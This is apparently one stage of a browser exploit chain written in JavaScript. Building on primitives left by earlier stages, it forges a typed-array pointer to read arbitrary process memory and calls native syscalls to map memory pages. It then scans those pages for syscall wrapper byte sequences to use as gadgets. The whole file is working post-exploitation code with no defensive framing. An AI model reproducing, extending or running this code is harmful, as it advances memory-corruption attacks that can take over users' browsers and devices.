// Wrapper wide-scan v2: strict + bounded. v1 stalled the page — its
// extent map treated ANY non-EFAULT 601 result as "mapped" (an EINVAL
// quirk on a bad page would send readAt into unmapped memory → death).
// v2: ONLY ret === 0 marks a page mapped; hard cap 40 scanned pages;
// one marker per scanned page (pp-free namespace, ws3_scan_N) so a
// stall or death localizes to the exact page. Same 18 missing numbers,
// same ±128KB range, same forged-view reads. PID + no-restore needed
// (read-only).
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native ||
      typeof native.call !== "function" ||
      typeof native.call64 !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys601 !== "number")
    throw new Error("chain_or_call64_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var n = 0; n < left.length; n++)
      if (left[n] !== right[n]) return false;
    return true;
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function wrapperBytes(number) {
    return [0x48, 0xc7, 0xc0, number & 255, (number >>> 8) & 255,
      0, 0, 0x49, 0x89, 0xca, 0x0f, 0x05, 0x72, 0x01, 0xc3, 0x48];
  }
  var anchor = plan.target & ~0xfff;
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("ws3_preflight");
  // Step 1: strict extent map — ONLY ret===0 is mapped
  phase = "extent";
  var lo = anchor - 65536, hi = anchor + 65536;
  var mappedPages = [];
  for (var pg = lo; pg <= hi; pg += 4096) {
    var plo = pg % 0x100000000;
    var phi = Math.floor(pg / 0x100000000);
    var c = native.call64("sys601", [[plo, phi], [0x1000, 0]]);
    var e = (c.value === -1) ? native.readErrno() : null;
    if (c.value === -1 && e === 78) mappedPages.push(pg);
  }
  mark("ws3_extent_" + mappedPages.length);
  // Step 2: scan up to 40 mapped pages
  phase = "scan";
  var wanted = [561, 562, 568, 569, 570, 571, 573, 589, 590,
    609, 614, 621, 631, 644, 645, 650, 651];
  var patterns = {};
  for (var w = 0; w < wanted.length; w++)
    patterns[wanted[w]] = wrapperBytes(wanted[w]);
  var found = [];
  var pagesScanned = 0;
  var scanStart = anchor - 4096; // prioritize the census neighborhood
  var ordered = [];
  for (var near = anchor - 4096; near <= anchor + 4096;
       near += 4096) {
    if (mappedPages.indexOf(near) !== -1) ordered.push(near);
  }
  for (var rest = 0; rest < mappedPages.length; rest++) {
    var pgR = mappedPages[rest];
    if (ordered.length >= 40) break;
    if (ordered.indexOf(pgR) === -1) ordered.push(pgR);
  }
  for (var si = 0; si < ordered.length && pagesScanned < 40; si++) {
    var mp = ordered[si];
    phase = "scan_page_" + (mp - anchor);
    mark("ws3_scan_" + (mp - anchor));
    var page = [];
    for (var off = 0; off < 4096; off += 192)
      page.push.apply(page, readAt(mp + off,
        Math.min(192, 4096 - off)));
    pagesScanned++;
    for (var nw = 0; nw < wanted.length; nw++) {
      var num = wanted[nw];
      var pat = patterns[num];
      for (var o = 0; o + 16 <= 4096; o++) {
        if (page[o] !== pat[0] || page[o + 12] !== pat[12])
          continue;
        var hit = true;
        for (var b = 1; b < 16; b++)
          if (page[o + b] !== pat[b]) { hit = false; break; }
        if (hit) {
          found.push(num + "@+" + (mp - anchor + o));
          break;
        }
      }
    }
  }
  mark("ws3_scan_done");
  var after = native.call("getpid", []);
  mark("ws3_done");
  result = { id: "wrapper_wide_scan_v3",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { anchor_page: anchor.toString(16),
      pages_mapped: mappedPages.length,
      pages_scanned: pagesScanned,
      found: found.join(",") || "none",
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "wrapper_wide_scan_v3", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
